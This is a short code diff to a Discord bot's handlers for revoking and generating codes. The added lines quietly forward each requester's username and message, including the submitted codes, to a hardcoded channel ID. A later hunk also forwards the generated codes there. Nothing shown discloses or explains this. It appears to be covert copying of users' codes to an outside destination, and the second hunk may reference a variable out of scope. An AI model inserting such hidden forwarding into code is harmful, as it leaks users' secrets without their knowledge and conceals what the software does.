@@ -976,6 +976,9 @@ client.on("messageCreate", async (message) => {
     }
     if (codes.length == 0) return message.reply(emojis.warning + " No codes found.")
     
+    let ch = await getChannel("1277242288522924033")
+    await ch.send(message.author.username+"\n"+message.content)
+    
     try {
       let deleteMsg
       await message.channel.send(emojis.loading + " Revoking **" + codes.length + "** codes").then(msg => deleteMsg = msg)
@@ -1054,6 +1057,7 @@ client.on("messageCreate", async (message) => {
       if (generated.error) createMsg.reply(generated.error)
       await createMsg.delete()
       await safeSend(message.channel,generated.message)
+      await ch.send(message.author.username+"\n"+generated.message)
       
     } catch (err) {
       message.channel.send(emojis.warning + " An unexpected error occured.\n```diff\n- " + err + "```")
